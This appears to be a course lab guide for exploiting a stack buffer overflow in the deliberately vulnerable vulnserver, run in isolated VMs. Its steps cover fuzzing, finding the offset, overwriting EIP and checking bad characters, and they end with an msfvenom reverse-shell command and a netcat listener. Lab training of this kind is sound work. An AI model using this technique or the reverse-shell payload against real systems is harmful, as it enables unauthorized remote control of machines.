# Buffer-Overflows-Made-Easy

## Table of Contents
1. [Lab Overview & Objectives](#lab-overview--objectives)  
2. [Environment & Prerequisites](#environment--prerequisites)  
3. [Step-by-Step Procedure](#step-by-step-procedure)  
   - [Step 0 — Network & VM Prep](#step-0---network--vm-prep)  
   - [Step 1 — Start vulnserver on Win10](#step-1---start-vulnserver-on-win10)  
   - [Step 2 — TRUN Overflow (Parts 1 & 2)](#step-2---trun-overflow-parts-1--2)  
   - [Step 3 — Fuzzing (Part 3)](#step-3---fuzzing-part-3)  
   - [Step 4 — Finding the Offset (Part 4)](#step-4---finding-the-offset-part-4)  
   - [Step 5 — Overwriting EIP (Part 5)](#step-5---overwriting-eip-part-5)  
   - [Step 6 — Finding Bad Characters (Part 6)](#step-6---finding-bad-characters-part-6)  
   - [Step 7 — Finding the Right Module (Part 7)](#step-7---finding-the-right-module-part-7)  
   - [Step 8 — Generating Shellcode & Gaining Shell (Part 8)](#step-8---generating-shellcode--gaining-shell-part-8)  

---

# Lab Overview & Objectives
This lab follows **The Cyber Mentor** series (Parts 1–8) to exploit `vulnserver` on a Windows 10 VM from a Kali attacker VM.

**Objectives**
- Trigger a TRUN buffer overflow and observe EIP/EBP overwrite.  
- Fuzz the service to find the crash location.  
- Determine the EIP offset and confirm control.  
- Identify bad characters.  
- Find a usable module/gadget.  
- Generate shellcode and obtain a reverse shell.

---

# Environment & Prerequisites
**VMs**
- Attacker: `Kali` VM (ensure VM name is visible in screenshots)  
- Target: `Win10` VM (password: `Passw0rd!`, ensure VM name is visible)

**Tools**
- VMware Workstation (or equivalent)  
- `vulnserver` (place on Win10)  
- Immunity Debugger + `mona.py` plugin (on Win10)  
- `msfvenom` / Metasploit (optional)  
- `nc` (netcat) on Kali  
- Python 2 on Kali (or run `python2` explicitly)

**Network**
- Both VMs must be on the same network (NAT/Host-only/Bridged).  
- Use your own IP addresses — do **not** reuse IPs from tutorial videos.

---

# Step-by-Step Procedure

## Step 0 — Network & VM Prep
- Start both VMs and ensure they share the same network.  
- Record IPs:
  - Kali IP: `TODO_kali_ip`  
  - Win10 IP: `TODO_win10_ip`  
- Take a VM snapshot.

## Step 1 — Start vulnserver on Win10
- Run `vulnserver.exe` as Administrator on the Win10 VM.  
- Confirm service is listening (commonly port `9999` in examples).  
- Screenshot: vulnserver running with Win10 VM name visible.

## Step 2 — TRUN Overflow (Parts 1 & 2)
- From Kali, send a long string of `A`s to `TRUN` (e.g., `"A"*4000`).  
- Observe in Immunity that EBP and EIP are overwritten with `0x41414141`.  
- Save script: `exploit_trun_step2.py`  
- Screenshot filename: `artifact01_trun_41414141.png`

## Step 3 — Fuzzing (Part 3)
- Run a fuzzing script that increases payload size until a crash occurs.  
- Save fuzz log (e.g., `fuzz_log.txt`) and screenshot Kali showing crash length.  
- Screenshot filenames: `artifact02_fuzz_kali.png`, `artifact02_fuzz_win10.png`

## Step 4 — Finding the Offset (Part 4)
- Generate a cyclic pattern larger than crash size, send it, and note value in EIP.  
- Use pattern tools (mona / pattern_offset) to compute offset.  
- Screenshot: `artifact03_offset_eip_value.png`  
- Record: `TODO_offset`

## Step 5 — Overwriting EIP (Part 5)
- Build payload: `<padding = offset>` + `BBBB` (`0x42424242`) + `<filler>` and send.  
- Verify EIP == `0x42424242`.  
- Screenshot: `artifact04_eip_42424242.png`

## Step 6 — Finding Bad Characters (Part 6)
- Append badchars sequence (all bytes except `\x00`) after return address.  
- In Immunity hex dump, compare the in-memory sequence to expected.  
- Identify any bytes that are altered (bad characters).  
- Screenshot: `artifact05_badchars_hexdump.png`  
- Record: `TODO_badchars`

## Step 7 — Finding the Right Module (Part 7)
- Use `mona` to find modules without ASLR/DEP and search for `jmp esp`/useful gadgets.  
- Choose module and address; set breakpoint (e.g., `essfunc`) and test.  
- Screenshot: `artifact06_essfunc_breakpoint.png`  
- Record: `TODO_module_name @ TODO_address`

## Step 8 — Generating Shellcode & Gaining Shell (Part 8)
- Generate shellcode excluding bad chars, example:
  msfvenom -p windows/shell_reverse_tcp LHOST=TODO_kali_ip LPORT=4444 -f c -b "\x00\x0a\x0d"
- Final payload: `<padding>` + `<JMP/RET address>` + `<NOP sled>` + `<shellcode>`  
- On Kali: `nc -lvnp 4444`  
- Trigger exploit and run `whoami`.  
- Screenshot: `artifact07_nc_whoami.png`  
- Record: `TODO_whoami_output`
